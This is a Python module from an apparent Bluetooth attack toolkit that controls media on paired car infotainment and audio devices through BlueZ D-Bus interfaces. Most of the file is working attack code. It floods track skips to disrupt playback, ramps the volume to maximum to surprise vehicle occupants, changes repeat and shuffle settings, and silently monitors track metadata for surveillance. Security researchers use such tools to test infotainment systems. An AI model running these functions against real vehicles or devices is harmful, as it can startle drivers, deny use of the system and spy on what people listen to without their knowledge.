"""AVRCP (Audio/Video Remote Control Profile) media control attacks.

Uses D-Bus to interact with BlueZ's MediaPlayer1 and MediaTransport1
interfaces for controlling media playback on paired IVI/audio devices.

Attack capabilities:
  - Remote media control (play, pause, skip, stop)
  - Volume manipulation (ramp to max, forced level)
  - Track skip flooding (DoS media playback)
  - Metadata monitoring (passive track surveillance)
"""

import time
import threading

from blue_tap.utils.output import info, success, error, warning
from blue_tap.utils.bt_helpers import normalize_mac


def _dbus_to_python(value):
    """Convert dbus types to native Python types."""
    try:
        import dbus
        if isinstance(value, (dbus.UInt32, dbus.Int32, dbus.UInt16, dbus.Int16,
                              dbus.UInt64, dbus.Int64, dbus.Byte)):
            return int(value)
        if isinstance(value, dbus.Double):
            return float(value)
        if isinstance(value, dbus.Boolean):
            return bool(value)
        if isinstance(value, (dbus.String, dbus.ObjectPath)):
            return str(value)
        if isinstance(value, dbus.Array):
            return [_dbus_to_python(v) for v in value]
        if isinstance(value, dbus.Dictionary):
            return {str(k): _dbus_to_python(v) for k, v in value.items()}
    except ImportError:
        pass
    return str(value)


BLUEZ_SERVICE = "org.bluez"
BLUEZ_MEDIA_PLAYER = "org.bluez.MediaPlayer1"
BLUEZ_MEDIA_TRANSPORT = "org.bluez.MediaTransport1"
DBUS_OBJECT_MANAGER = "org.freedesktop.DBus.ObjectManager"
DBUS_PROPERTIES = "org.freedesktop.DBus.Properties"


class AVRCPController:
    """AVRCP controller for media manipulation on Bluetooth targets.

    Usage:
        avrcp = AVRCPController("AA:BB:CC:DD:EE:FF")
        avrcp.connect()
        avrcp.play()
        avrcp.volume_ramp(target=127)
        avrcp.skip_flood(count=50)
        avrcp.disconnect()
    """

    def __init__(self, address: str, hci: str = "hci0"):
        self.address = normalize_mac(address)
        self.hci = hci
        self.dbus_path = None
        self.player_iface = None
        self.transport_iface = None
        self._bus = None
        self._props_iface = None
        self._transport_props = None

    def connect(self) -> bool:
        """Connect to the BlueZ MediaPlayer1 interface via D-Bus.

        Scans BlueZ managed objects for a MediaPlayer1 matching the
        target device MAC address.
        """
        from blue_tap.utils.bt_helpers import ensure_adapter_ready
        if not ensure_adapter_ready(self.hci, timeout=3, auto_up=False):
            error(f"Adapter {self.hci} not ready for AVRCP control")
            return False

        try:
            import dbus
        except ImportError:
            error("python-dbus not installed. Install: apt install python3-dbus")
            return False

        mac_path = self.address.replace(":", "_")
        dev_prefix = f"/org/bluez/{self.hci}/dev_{mac_path}"

        try:
            self._bus = dbus.SystemBus()
            manager = dbus.Interface(
                self._bus.get_object(BLUEZ_SERVICE, "/"),
                DBUS_OBJECT_MANAGER,
            )
            objects = manager.GetManagedObjects()
        except Exception as e:
            error(f"D-Bus connection failed: {e}")
            return False

        # Find MediaPlayer1 for this device
        for path, interfaces in objects.items():
            if str(path).startswith(dev_prefix) and BLUEZ_MEDIA_PLAYER in interfaces:
                self.dbus_path = path
                try:
                    obj = self._bus.get_object(BLUEZ_SERVICE, path)
                    self.player_iface = dbus.Interface(obj, BLUEZ_MEDIA_PLAYER)
                    self._props_iface = dbus.Interface(obj, DBUS_PROPERTIES)
                    success(f"AVRCP connected: {path}")
                except Exception as e:
                    error(f"Failed to get player interface: {e}")
                    return False

                # Also look for MediaTransport1
                self._find_transport(objects, dev_prefix)
                return True

        error(f"No MediaPlayer1 found for {self.address}")
        warning("Ensure the device is paired, connected, and playing media")
        return False

    def disconnect(self):
        """Disconnect from the BlueZ MediaPlayer1 interface."""
        self.player_iface = None
        self.transport_iface = None
        self._props_iface = None
        self._transport_props = None
        self._bus = None
        self.dbus_path = None
        info("AVRCP disconnected")

    def _find_transport(self, objects: dict, dev_prefix: str):
        """Locate the MediaTransport1 interface for volume control."""
        try:
            import dbus
        except ImportError:
            warning("python-dbus not installed; transport controls unavailable")
            return

        for path, interfaces in objects.items():
            if str(path).startswith(dev_prefix) and BLUEZ_MEDIA_TRANSPORT in interfaces:
                try:
                    obj = self._bus.get_object(BLUEZ_SERVICE, path)
                    self.transport_iface = dbus.Interface(obj, BLUEZ_MEDIA_TRANSPORT)
                    self._transport_props = dbus.Interface(obj, DBUS_PROPERTIES)
                    info(f"Media transport found: {path}")
                except Exception as e:
                    warning(f"Transport interface unavailable: {e}")

    # ========================================================================
    # Transport Controls
    # ========================================================================

    def play(self) -> bool:
        """Send Play command."""
        return self._call_player("Play", "Play sent")

    def pause(self) -> bool:
        """Send Pause command."""
        return self._call_player("Pause", "Pause sent")

    def stop(self) -> bool:
        """Send Stop command."""
        return self._call_player("Stop", "Stop sent")

    def next_track(self) -> bool:
        """Send Next track command."""
        return self._call_player("Next", "Next track")

    def previous_track(self) -> bool:
        """Send Previous track command."""
        return self._call_player("Previous", "Previous track")

    def _call_player(self, method: str, msg: str) -> bool:
        """Call a method on the MediaPlayer1 interface."""
        if not self.player_iface:
            error("Not connected - call connect() first")
            return False
        try:
            getattr(self.player_iface, method)()
            success(msg)
            return True
        except Exception as e:
            error(f"{method} failed: {e}")
            return False

    # ========================================================================
    # Properties
    # ========================================================================

    def get_track_info(self) -> dict:
        """Read current track metadata (Title, Artist, Album, Duration, etc)."""
        if not self._props_iface:
            error("Not connected")
            return {}
        try:
            track = self._props_iface.Get(BLUEZ_MEDIA_PLAYER, "Track")
            result = {str(k): _dbus_to_python(v) for k, v in track.items()}
            info(f"Track: {result.get('Artist', '?')} - {result.get('Title', '?')}")
            return result
        except Exception as e:
            error(f"Failed to read track info: {e}")
            return {}

    def get_status(self) -> str:
        """Read playback status (playing, paused, stopped, etc)."""
        if not self._props_iface:
            error("Not connected")
            return ""
        try:
            status = str(self._props_iface.Get(BLUEZ_MEDIA_PLAYER, "Status"))
            info(f"Status: {status}")
            return status
        except Exception as e:
            error(f"Failed to read status: {e}")
            return ""

    def set_volume(self, level: int) -> bool:
        """Set absolute volume via MediaTransport1 (0-127)."""
        level = max(0, min(127, level))
        if not self._transport_props:
            error("No media transport available for volume control")
            return False
        try:
            import dbus
            self._transport_props.Set(
                BLUEZ_MEDIA_TRANSPORT, "Volume", dbus.UInt16(level),
            )
            success(f"Volume set to {level}/127")
            return True
        except Exception as e:
            error(f"Volume set failed: {e}")
            return False

    # ========================================================================
    # Attack Functions
    # ========================================================================

    def get_player_info(self) -> dict:
        """Get info about the active media player app.

        The Name property often reveals which app is active:
        'Spotify', 'FM Radio', 'USB Music', 'Bluetooth Audio', etc.

        This is passive surveillance — user doesn't see any indication.
        """
        if not self._props_iface:
            error("Not connected")
            return {}
        try:
            result = {}
            for prop in ("Name", "Type", "Subtype", "Status", "Position", "Browsable", "Searchable"):
                try:
                    val = self._props_iface.Get(BLUEZ_MEDIA_PLAYER, prop)
                    result[prop] = _dbus_to_python(val)
                except Exception:
                    pass
            if result.get("Name"):
                info(f"Active player: {result['Name']} ({result.get('Status', '?')})")
            return result
        except Exception as e:
            error(f"Failed to get player info: {e}")
            return {}

    def get_player_settings(self) -> dict:
        """Read player application settings (equalizer, repeat, shuffle).

        These settings reveal user preferences and can be manipulated
        to disrupt the listening experience.
        """
        if not self._props_iface:
            return {}
        try:
            result = {}
            for prop in ("Equalizer", "Repeat", "Shuffle", "Scan"):
                try:
                    val = self._props_iface.Get(BLUEZ_MEDIA_PLAYER, prop)
                    result[prop] = _dbus_to_python(val)
                except Exception:
                    pass
            if result:
                info(f"Player settings: {result}")
            return result
        except Exception:
            return {}

    def set_repeat(self, mode: str) -> bool:
        """Set repeat mode: 'off', 'singletrack', 'alltracks', 'group'."""
        return self._set_player_setting("Repeat", mode)

    def set_shuffle(self, mode: str) -> bool:
        """Set shuffle mode: 'off', 'alltracks', 'group'."""
        return self._set_player_setting("Shuffle", mode)

    def _set_player_setting(self, prop: str, value: str) -> bool:
        """Set a player application setting via D-Bus."""
        if not self._props_iface:
            error("Not connected")
            return False
        try:
            import dbus
            self._props_iface.Set(BLUEZ_MEDIA_PLAYER, prop, dbus.String(value))
            success(f"Set {prop} = {value}")
            return True
        except Exception as e:
            error(f"Failed to set {prop}: {e}")
            return False

    def fast_forward(self) -> bool:
        """Send FastForward command."""
        return self._call_player("FastForward", "Fast forward")

    def rewind(self) -> bool:
        """Send Rewind command."""
        return self._call_player("Rewind", "Rewind")

    def volume_ramp(self, start: int = 0, target: int = 127, step_ms: int = 100) -> bool:
        """Gradually ramp volume from start to target.

        Useful for testing volume enforcement and surprising occupants.
        """
        start = max(0, min(127, start))
        target = max(0, min(127, target))
        info(f"Volume ramp: {start} -> {target} (step {step_ms}ms)")
        delay = step_ms / 1000.0

        if not self.set_volume(start):
            return False

        for level in range(start + 1, target + 1):
            if not self.set_volume(level):
                warning(f"Ramp stopped at {level}")
                return False
            time.sleep(delay)

        success(f"Volume ramp complete: {target}/127")
        return True

    def skip_flood(self, count: int = 100, interval_ms: int = 100) -> bool:
        """Rapidly send Next Track commands to disrupt media playback.

        Args:
            count: Number of skip commands to send
            interval_ms: Delay between commands in milliseconds
        """
        info(f"Skip flood: {count} skips @ {interval_ms}ms interval")
        delay = interval_ms / 1000.0
        sent = 0

        for i in range(count):
            if not self.player_iface:
                error("Connection lost during flood")
                break
            try:
                self.player_iface.Next()
                sent += 1
            except Exception as e:
                warning(f"Skip {i+1} failed: {e}")
            time.sleep(delay)

        success(f"Skip flood complete: {sent}/{count} sent")
        return sent > 0

    def monitor_metadata(self, duration: int = 300, callback=None) -> None:
        """Monitor track changes via D-Bus PropertiesChanged signal.

        Watches for metadata updates on MediaPlayer1 for passive
        surveillance of what the target is listening to.

        Args:
            duration: Monitoring duration in seconds
            callback: Optional callable(track_dict) for each change
        """
        try:
            import dbus
            from dbus.mainloop.glib import DBusGMainLoop
            from gi.repository import GLib
        except ImportError:
            error("python-dbus / PyGObject not installed; cannot monitor metadata")
            return

        info(f"Monitoring metadata for {duration}s...")
        DBusGMainLoop(set_as_default=True)
        bus = dbus.SystemBus()
        loop = GLib.MainLoop()

        def on_properties_changed(interface, changed, invalidated):
            if interface != BLUEZ_MEDIA_PLAYER:
                return
            if "Track" in changed:
                track = {str(k): _dbus_to_python(v) for k, v in changed["Track"].items()}
                artist = track.get("Artist", "Unknown")
                title = track.get("Title", "Unknown")
                info(f"Track changed: {artist} - {title}")
                if callback:
                    callback(changed)
            if "Status" in changed:
                info(f"Status changed: {changed['Status']}")

        if self.dbus_path:
            bus.add_signal_receiver(
                on_properties_changed,
                signal_name="PropertiesChanged",
                dbus_interface=DBUS_PROPERTIES,
                path=self.dbus_path,
            )
        else:
            warning("No player path - listening on all MediaPlayer1 signals")
            bus.add_signal_receiver(
                on_properties_changed,
                signal_name="PropertiesChanged",
                dbus_interface=DBUS_PROPERTIES,
            )

        # Stop the loop after duration
        timer = threading.Timer(duration, loop.quit)
        timer.daemon = True
        timer.start()

        try:
            loop.run()
        except KeyboardInterrupt:
            pass
        finally:
            timer.cancel()
            success("Metadata monitoring stopped")
